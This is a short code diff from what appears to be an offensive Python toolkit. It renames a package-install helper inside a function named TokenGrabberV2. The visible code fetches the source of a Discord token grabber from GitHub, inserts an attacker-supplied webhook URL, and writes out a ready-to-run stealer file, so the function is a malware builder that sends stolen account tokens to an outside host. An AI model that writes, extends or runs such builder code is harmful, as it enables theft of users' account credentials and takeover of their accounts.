@@ -14,7 +14,7 @@ from Crypto.Cipher import AES
 from Crypto import Random
 from colorama import Fore
 
-from util.plugins.common import setTitle, install_lib
+from util.plugins.common import setTitle, installPackage
 
 def TokenGrabberV2(WebHook, fileName):
     required = [
@@ -26,7 +26,7 @@ def TokenGrabberV2(WebHook, fileName):
         'pyautogui',
         'numpy'
     ]
-    install_lib(required)
+    installPackage(required)
     code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
     with open(f"{fileName}.py", 'w') as f:
         f.write(code)
